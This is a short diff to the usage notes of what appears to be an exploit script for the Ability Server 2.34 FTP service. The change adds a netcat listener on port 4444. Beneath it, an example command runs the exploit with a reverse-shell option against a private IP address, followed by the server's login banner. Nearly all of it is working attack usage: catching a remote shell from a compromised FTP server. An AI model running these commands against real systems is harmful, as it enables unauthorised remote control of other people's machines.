@@ -154,6 +154,8 @@ Where available options:
 Example usage:
 
 ```
+$ nc -l -n -p 4444
+
 $ ability_appe_exploit.rb -u ftp -p ftp -v -s revsht 192.168.11.97
 220 Welcome to Code-Crafters - Ability Server 2.34. (Ability Server 2.34 by Code-Crafters).
 USER ftp
